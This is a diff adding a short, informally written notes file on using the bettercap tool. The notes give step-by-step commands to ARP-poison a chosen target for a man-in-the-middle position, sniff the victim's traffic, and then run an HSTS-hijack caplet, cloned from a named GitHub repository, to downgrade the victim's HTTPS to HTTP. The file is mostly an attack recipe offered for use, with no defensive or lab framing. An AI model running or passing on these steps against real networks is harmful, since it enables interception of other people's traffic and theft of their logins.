@@ -1,0 +1,36 @@
+bettercap software is a tool for different attack in network like ARP poison:
+
+RUN SOFTWARE:
+bettercap -iface eth0 (depends of the adapter) 
+help - fore more options:
+
+FOR ANY FUNCTION INFORMATION TYPE:
+EXAMPLE:
+help arp.spoof 
+
+
+EXAMPLE ATTACK:
+ARP POISON: (MITM) man in the middle:
+
+1.) net.probe on (start probing the network)
+2.) net.show (more information)
+3.) set arp.spoof.fullduplex true
+4.) set arp.spoof.internal true (if there is a problem make it false)
+5.) set arp.spoof.targets (target ip found in setps 1 and 2)
+6.) arp.spoof on (it starting the attack)
+7.) net.sniff on (gathering the traffic on the victim)
+
+HSTS: Downgrading https to http:
+These steps are imidietly after above steps 
+NOTE: IT DOESNT WORK EVERYTIME BECOASE OF SECURITY MEASURES:
+
+IN bettercap:
+1.) caplets.show (shows the peaces of codes and commands that we can run in bettercap) (WE ARE LOOCKING FOR "hstshijack.cap"
+
+2.) hstshijack/hstshijack (downgrading the HTTPS to HTTP on the victim machine)
+
+hstshijack.cap replacement: if we want!
+LINK: (https://github.com/atilsamancioglu/hstshijackcaplet)
+3.)git-clone https://github.com/atilsamancioglu/hstshijackcaplet.git
+4.) replace the downloaded files with the files that are original and located in step 1
+
